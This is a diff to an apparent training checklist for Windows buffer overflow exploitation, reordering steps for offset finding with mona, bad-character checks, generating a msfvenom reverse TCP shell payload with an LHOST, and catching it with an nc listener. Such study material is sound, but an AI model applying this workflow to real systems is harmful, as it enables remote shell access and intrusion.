@@ -37,21 +37,13 @@ msf-pattern_create -l ???
 ```bash
 # restart the app first
 vim exploit.py # PAYLOAD: (output above)
-python fuzzer.py
+python exploit.py
 
 # output
 ```
 
 ```bash
 !mona findmsp -distance ???
-
-# output
-```
-
-```bash
-# restart the app first
-vim exploit.py # OFFSET: ???, PAYLOAD: "", RETN: "BBBB"
-python exploit.py
 
 # output
 ```
@@ -65,7 +57,11 @@ bytearray
 ```
 
 ```bash
-vim exploit.py # PAYLOAD: (output above)
+# restart the app first
+vim exploit.py # OFFSET: ???, PAYLOAD: (output above), RETN: "BBBB"
+python exploit.py
+
+# output
 ```
 
 ```bash
@@ -142,10 +138,6 @@ vim exploit.py # BADCHARS = "\x00\x??\x??\x??\x??"
 # output
 ```
 
-```bash
-vim exploit.py # RETN: "???"
-```
-
 ## Generate a Payload
 
 USE YOUR IP ADDRESS FOR THE LHOST!
@@ -158,12 +150,10 @@ msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f python -v PAYLOA
 # output
 ```
 
-```bash
-vim exploit.py # PAYLOAD: (output above), PADDING: "\x90" * 16
-```
-
 ## Send the Exploit
 ```bash
+# restart the app first
+vim exploit.py # RETN: (address of JMP instruction found), PAYLOAD: (output above), PADDING: "\x90" * 16
 python exploit.py
 
 # output
@@ -175,7 +165,7 @@ sudo nc -nvlp 443
 # output
 ```
 
-### Exploit
+## Exploit
 ```python
 #!/usr/bin/env python3
 
